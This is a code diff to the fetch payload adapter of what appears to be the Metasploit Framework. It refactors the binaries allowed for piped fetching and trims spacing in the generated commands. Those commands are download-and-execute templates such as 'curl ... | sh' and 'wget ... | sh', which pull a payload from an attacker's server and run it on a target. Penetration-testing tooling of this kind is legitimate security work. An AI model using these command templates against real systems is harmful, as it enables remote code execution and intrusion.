@@ -82,16 +82,19 @@ module Msf::Payload::Adapter::Fetch
     Rex::Socket.to_authority(fetch_bindhost, fetch_bindport)
   end
 
+  def pipe_supported_binaries
+    # this is going to expand when we add psh support
+    return %w[CURL] if windows?
+    %w[WGET CURL]
+  end
 
   def generate(opts = {})
     opts[:arch] ||= module_info['AdaptedArch']
     opts[:code] = super
     @srvexe = generate_payload_exe(opts)
     if datastore['FETCH_PIPE']
-      supported_binaries = %w[CURL]
-      supported_binaries = %w[WGET CURL] if linux?
-      unless supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
-        fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be WGET or CURL.")
+      unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
+        fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
       end
       @pipe_cmd = generate_fetch_commands
       @pipe_cmd << "\n" if windows? #need CR when we pipe command in Windows
@@ -118,7 +121,8 @@ module Msf::Payload::Adapter::Fetch
     when 'CURL'
       return _generate_curl_pipe
     else
-      fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be WGET or CURL.")    end
+      fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
+    end
   end
 
   def generate_fetch_commands
@@ -320,11 +324,11 @@ module Msf::Payload::Adapter::Fetch
     execute_cmd = 'cmd' if windows?
     case fetch_protocol
     when 'HTTP'
-      return "curl -s http://#{_download_pipe} | #{execute_cmd}"
+      return "curl -s http://#{_download_pipe}|#{execute_cmd}"
     when 'HTTPS'
-      return "curl -sk https://#{_download_pipe} | #{execute_cmd}"
+      return "curl -sk https://#{_download_pipe}|#{execute_cmd}"
     when 'TFTP'
-      return "curl -s tftp://#{_download_pipe} | #{execute_cmd}"
+      return "curl -s tftp://#{_download_pipe}|#{execute_cmd}"
     else
       fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
     end
@@ -394,9 +398,9 @@ module Msf::Payload::Adapter::Fetch
   def _generate_wget_pipe
     case fetch_protocol
     when 'HTTPS'
-      return "wget --no-check-certificate -qO - https://#{_download_pipe} | sh"
+      return "wget --no-check-certificate -qO - https://#{_download_pipe}|sh"
     when 'HTTP'
-      return "wget -qO - http://#{_download_pipe} | sh"
+      return "wget -qO - http://#{_download_pipe}|sh"
     else
       fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
     end
